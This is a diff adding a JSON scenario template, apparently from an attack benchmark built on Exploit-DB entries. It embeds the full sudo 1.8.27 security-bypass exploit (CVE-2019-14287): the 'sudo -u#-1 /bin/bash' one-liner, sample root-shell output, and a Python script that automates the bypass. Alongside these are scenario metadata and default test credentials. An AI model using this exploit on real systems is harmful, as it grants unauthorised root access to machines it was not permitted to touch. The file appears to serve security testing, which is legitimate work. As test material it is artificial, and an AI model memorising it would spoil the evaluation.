@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_47502",
+  "category": "A2_sudo",
+  "attack_technique": "T1548.003",
+  "cwe": "CWE-269",
+  "description": "Linux privilege escalation: sudo 1.8.27 - Security Bypass (CVE-2019-14287)\n\nExploit source code (47502.py):\n```\n# Exploit Title : sudo 1.8.27 - Security Bypass\n# Date : 2019-10-15\n# Original Author: Joe Vennix\n# Exploit Author : Mohin Paramasivam (Shad0wQu35t)\n# Version : Sudo <1.8.28\n# Tested on Linux\n# Credit : Joe Vennix from Apple Information Security found and analyzed the bug\n# Fix : The bug is fixed in sudo 1.8.28\n# CVE : 2019-14287\n\n'''Check for the user sudo permissions\n\nsudo -l\n\nUser hacker may run the following commands on kali:\n    (ALL, !root) /bin/bash\n\n\nSo user hacker can't run /bin/bash as root (!root)\n\n\nUser hacker sudo privilege in /etc/sudoers\n\n# User privilege specification\nroot    ALL=(ALL:ALL) ALL\n\nhacker ALL=(ALL,!root) /bin/bash\n\n\nWith ALL specified, user hacker can run the binary /bin/bash as any user\n\nEXPLOIT:\n\nsudo -u#-1 /bin/bash\n\nExample :\n\nhacker@kali:~$ sudo -u#-1 /bin/bash\nroot@kali:/home/hacker# id\nuid=0(root) gid=1000(hacker) groups=1000(hacker)\nroot@kali:/home/hacker#\n\nDescription :\nSudo doesn't check for the existence of the specified user id and executes the with arbitrary user id with the sudo priv\n-u#-1 returns as 0 which is root's id\n\nand /bin/bash is executed with root permission\nProof of Concept Code :\n\nHow to use :\npython3 sudo_exploit.py\n\n'''\n\n\n#!/usr/bin/python3\n\nimport os\n\n#Get current username\n\nusername = input(\"Enter current username :\")\n\n\n#check which binary the user can run with sudo\n\nos.system(\"sudo -l > priv\")\n\n\nos.system(\"cat priv | grep 'ALL' | cut -d ')' -f 2 > binary\")\n\nbinary_file = open(\"binary\")\n\nbinary= binary_file.read()\n\n#execute sudo exploit\n\nprint(\"Lets hope it works\")\n\nos.system(\"sudo -u#-1 \"+ binary)\n```",
+  "cve": "CVE-2019-14287",
+  "exploitdb_id": "47502",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_47502",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
